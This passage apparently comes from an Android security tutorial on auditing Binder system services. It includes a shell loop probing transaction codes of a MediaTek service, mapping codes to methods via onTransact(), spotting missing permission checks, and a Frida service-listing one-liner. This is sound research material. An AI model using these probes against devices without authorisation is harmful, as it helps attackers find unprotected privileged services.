  \ 1 50); do\n    printf \"[+] %2d -> \" $i\n    service call mtkconnmetrics $i 2>/dev/null | head -1\ndone\n```\n\nIf the\
  \ service was compiled **with proguard** the mapping must be guessed – see next step.\n\n### 5. Mapping codes ↔ methods\
  \ via onTransact()\nDecompile the jar/odex that implements the interface (for AOSP stubs check `/system/framework`; OEMs\
  \ often use `/system_ext` or `/vendor`).  \nSearch for `Stub.onTransact()` – it contains a giant `switch(transactionCode)`:\n\
  \n```java\ncase TRANSACTION_updateCtaAppStatus:      // 5\n    data.enforceInterface(DESCRIPTOR);\n    int appId  = data.readInt();\n\
  \    boolean ok = data.readInt() != 0;\n    updateCtaAppStatus(appId, ok);\n    reply.writeNoException();\n    return true;\n\
  ```\n\nNow the prototype and **parameter types** are crystal clear.\n\n### 6. Spotting missing permission checks\nThe implementation\
  \ (often an inner `Impl` class) is responsible for authorisation:\n\n```java\nprivate void updateCtaAppStatus(int uid, boolean\
  \ status) {\n    if (!isPermissionAllowed()) {\n        throw new SecurityException(\"uid \" + uid + \" rejected\");\n \
  \   }\n    /* privileged code */\n}\n```\nAbsence of such logic or a whitelist of privileged UIDs (e.g. `uid == 1000 /*system*/`)\
  \ is a **vulnerability indicator**.\n\nCase study – *MediaTek* `startMonitorProcessWithUid()` (transaction **8**) fully\
  \ executes a Netlink message **without** any permission gate, allowing an unprivileged app to interact with the kernel’s\
  \ Netfilter module and spam the system log.\n\n### 7. Automating the assessment\nTools / scripts that speed-up Binder reconnaissance:\n\
  * [binderfs](https://android.googlesource.com/platform/frameworks/native/+/master/cmds/binderfs/) – exposes `/dev/binderfs`\
  \ with per-service nodes\n* [`binder-scanner.py`](https://github.com/adenflare/binder-scanner) – walks the binder table\
  \ and prints ACLs\n* Frida shortcut: `Java.perform(()=>console.log(android.os.ServiceManager.listServices().toArray()))`\n\
